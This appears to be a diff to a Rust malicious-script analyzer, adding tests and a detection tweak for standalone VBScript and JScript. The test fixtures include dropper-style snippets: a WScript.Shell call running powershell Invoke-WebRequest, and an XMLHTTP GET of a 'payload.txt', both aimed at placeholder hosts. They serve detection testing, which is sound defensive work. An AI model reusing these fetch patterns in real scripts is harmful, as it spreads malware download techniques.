@@ -928,6 +928,22 @@ main();"#,
     }
 
     #[test]
+    fn standalone_script_prescan_ignores_direct_js_const_with_wscript() {
+        let mut env = Environment::new(&AnalyzeConfig::default());
+        crate::pre_scan_standalone_script_input(
+            br#"const sh = new ActiveXObject("WScript.Shell");
+sh.Run("powershell -Command Invoke-WebRequest https://direct-js-const.example/p");"#,
+            &mut env,
+        );
+        assert!(
+            env.all_extracted_jscript.is_empty() && env.all_extracted_vbs.is_empty(),
+            "direct JScript const was queued as standalone script: js={} vbs={}",
+            env.all_extracted_jscript.len(),
+            env.all_extracted_vbs.len()
+        );
+    }
+
+    #[test]
     fn start_quoted_url_is_extracted() {
         // `start "" "URL"` opens the URL in the default handler.
         let script = b"start \"\" \"https://opened.example/doc.pdf\"\r\n";
@@ -2947,6 +2963,7 @@ fn first_meaningful_script_line(lower: &str) -> &str {
 fn starts_like_standalone_vbs(lower: &str) -> bool {
     let first = first_meaningful_script_line(lower);
     first.starts_with("dim ")
+        || (first.starts_with("const ") && !looks_like_js_script(lower))
         || (first.starts_with("set ") && first.contains("createobject"))
         || first.starts_with("option explicit")
         || first.starts_with("private function")
@@ -14347,6 +14364,33 @@ r.Main"#;
         );
         assert!(
             report.deobfuscated.contains("Class Runner\nPublic Sub"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_const_prefix_xmlhttp_url_extracted() {
+        let vbs = br#"Const u = "https://standalone-vbs-const.example/payload.txt"
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "https://standalone-vbs-const.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS with Const prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains(
+                "Const u = \"https://standalone-vbs-const.example/payload.txt\"\nSet http"
+            ),
             "standalone VBS source was not preserved in deobfuscated output: {:?}",
             report.deobfuscated
         );
